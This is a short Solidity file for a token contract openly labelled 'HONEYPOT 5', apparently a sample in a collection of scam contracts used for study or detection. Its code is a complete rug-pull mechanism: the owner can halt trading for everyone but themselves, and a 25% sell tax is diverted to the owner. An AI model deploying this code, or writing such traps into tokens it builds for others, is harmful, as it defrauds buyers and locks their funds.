// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "./Base.sol";

/// @notice HONEYPOT 5 — kill switch + sell tax. The owner can disable trading
/// for everyone except themselves at any moment, and sells to the pair are
/// taxed 25%. A soft rug: the token looks tradable until the owner flips it.
contract HoneyKillSwitch is ERC20Base {
    address public owner;
    address public pair;
    bool public tradingEnabled = true;

    constructor(address _pair) ERC20Base("HoneyTrap KillSwitch", "HKILL", 1_000_000 * 1e18) {
        owner = msg.sender;
        pair = _pair;
    }

    function setTradingEnabled(bool flag) external {
        require(msg.sender == owner, "only owner");
        tradingEnabled = flag;
    }

    function _transfer(address from, address to, uint256 value) internal override {
        require(tradingEnabled || from == owner, "trading disabled");
        if (to == pair && from != owner) {
            uint256 tax = (value * 25) / 100;
            super._transfer(from, owner, tax);
            super._transfer(from, to, value - tax);
        } else {
            super._transfer(from, to, value);
        }
    }
}
